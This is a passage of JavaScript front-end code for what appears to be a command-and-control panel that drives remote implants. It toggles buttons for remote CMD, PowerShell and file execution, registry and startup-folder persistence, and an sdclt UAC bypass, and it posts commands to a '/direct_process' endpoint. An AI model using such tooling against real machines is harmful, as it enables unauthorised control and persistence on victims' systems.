            $("#button_direct_classify_write_uploadFile").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_write_uploadFile").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/wallpaper_changer", l) > -1) {
            $("#button_direct_classify_write_wallpaperChanger").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_write_wallpaperChanger").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/execute_command_cmd", l) > -1) {
            $("#button_direct_classify_execute_CMD").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_execute_CMD").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/execute_command_powershell", l) > -1) {
            $("#button_direct_classify_execute_powershell").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_execute_powershell").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/execute_command_file", l) > -1) {
            $("#button_direct_classify_execute_file").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_execute_file").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/execute_file", l) > -1) {
            $("#button_direct_classify_execute_file").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_execute_file").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/execute_python", l) > -1) {
            $("#button_direct_classify_execute_python").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_execute_python").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/registry_persistence", l) > -1) {
            $("#button_direct_classify_persist_registryPersistence").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_persist_registryPersistence").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/sdclt_uac_bypass", l) > -1) {
            $("#button_direct_classify_persist_sdcltUACBypass").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_persist_sdcltUACBypass").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/startup_folder_persistence", l) > -1) {
            $("#button_direct_classify_persist_startupFolderPersistence").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_persist_startupFolderPersistence").prop('disabled', true).css("background-color", c);
        }
    }

    function displaySelectedFunctions(mainSelection, secondarySelection) {
        if (mainSelection !== "") {
            if (mainSelection === "read") {
                $(".br_direct_classify_read_break").show();
                $(".br_direct_classify_write_break").hide();
            } else if (mainSelection === "write") {
                $(".br_direct_classify_write_break").show();
                $(".br_direct_classify_read_break").hide();
            } else {
                $(".br_direct_classify_write_break").hide();
                $(".br_direct_classify_read_break").hide();
            }
            $("#div_direct_classify").show();
            $("#div_direct_classify_main_buttons").show();
            $("#button_direct_classify_main_" + mainSelection).css("background-color", "#42444a");
            $(".button_direct_classify_main").not($("#button_direct_classify_main_" + mainSelection)).css("background-color", "#2f3136");
            $(".div_direct_classify_" + mainSelection + "_buttons").show();
            $(".classify_buttons").not($(".div_direct_classify_" + mainSelection + "_buttons")).hide();
            //if (secondarySelection != "") {
                //$(".button_direct_classify_" + mainSelection).css("background-color", "#2f3136");
                //$("#button_direct_classify_" + mainSelection + "_" + secondarySelection).css("background-color", "#42444a");
            //}
        } else {
            $("#div_direct_classify").hide();
        }
    }

    function logToConsole(t, newline) {
        let $selector = $("#p_direct_components_console_output");
        let appendString = "";
        appendString = t.toString()
            .replace(/\[\+\]/g, "<p1 style='color: #13a10e'>[+]</p1>")
            .replace(/\[\*\]/g, "<p1 style='color: #3b78ff'>[*]</p1>")
            .replace(/\[\-\]/g, "<p1 style='color: #e74856'>[-]</p1>")
            .replace(/\[\!\]/g, "<p1 style='color: #f9f1a5'>[!]</p1>")
            .replace(/\[\>\]/g, "<p1 style='color: #b4009e'>[>]</p1>")
        appendString = String.raw`${appendString}`;
        appendString = appendString.replace(/\n/g, "<br>")
        $selector.append(appendString);
        if (newline) {
            $selector.append("<br>");
        }
        $selector.scrollTop($selector.prop("scrollHeight"));
    }

    function displayComponents(component) {
        $(".div_component").hide();
        $("#div_direct_components_" + component).show();
    }


    // GLOBAL FUNCTIONS !!
    function showMessage(msg){
        let elmt;
        if (ScoutGlobals.error) {
            elmt = document.getElementById("error");
        } else {
            elmt = document.getElementById("success");
        }
        elmt.innerHTML = esc(msg) + "<a onclick='closeMessage()' id='closeError'>x</a>";
        elmt.classList.remove('hide');
        elmt.classList.add('show');
    }

    function esc(str) {
        if(str){
            return str.toString()
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/\"/g, '&quot;')
                .replace(/\'/g, '&#39;')
                .replace(/\//g, '&#x2F;');
        }
        return "";
    }

    function scrollToTop() {
        document.body.scrollTop = 0; // For Safari
        document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
    }

    function triggerAjax (data, async, url, callback, extra_input){
        $.ajax({
            data: {
                command: data
            },
            type: 'POST',
            async: async,
            url: url,
            success: function (recvData) {
                if (extra_input !== undefined) {
                    callback(recvData, extra_input);
                }
                else {
                    callback(recvData);
                }
            }
        });
    }

    function triggerAjaxDirectInterface(data, async, callback, extra_input) {
        $.ajax({
            data: {
                command: data,
                scoutId: ScoutGlobals.bridgedId
            },
            type: 'POST',
            async: async,
            url: '/direct_process',
            success: function (recvData) {
                if (extra_input !== undefined) {
                    callback(recvData, extra_input);
                }
                else {
                    callback(recvData);
                }
            }
        });
    }

});

function tableRowClickable(clickable){
        if(clickable) {
            $("#table_scouts tr").not(":first").each(function() {
                $(this).addClass('clickable');
            })
        }
        else {
            $("#table_scouts tr").not(":first").each(function() {
                $(this).removeClass('clickable');
            })
        }
    }

function closeMessage(){
    let elmt;
    if (ScoutGlobals.error) {
        elmt = document.getElementById("error");
    } else {
        elmt = document.getElementById("success");
    }
    elmt.innerHTML = "";
    elmt.classList.remove('show');
    elmt.classList.add('hide');
}